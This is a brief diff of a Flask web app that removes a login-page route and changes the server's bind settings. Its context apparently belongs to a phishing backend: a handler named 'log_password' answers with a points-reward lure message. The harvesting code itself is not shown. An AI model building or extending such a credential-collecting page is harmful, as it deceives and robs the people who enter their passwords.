@@ -2,11 +2,6 @@ from flask import Flask, request, send_from_directory
 
 app = Flask(__name__)
 
-# Serve the HTML page at root
-@app.route('/')
-def serve_login():
-    return send_from_directory('.', 'index.html')
-
 # Serve the image
 @app.route('/banner.jpeg')
 def serve_image():
@@ -27,4 +22,4 @@ def log_password():
     return "Thank you! Your points will be credited soon."
 
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=8080)
+    app.run()
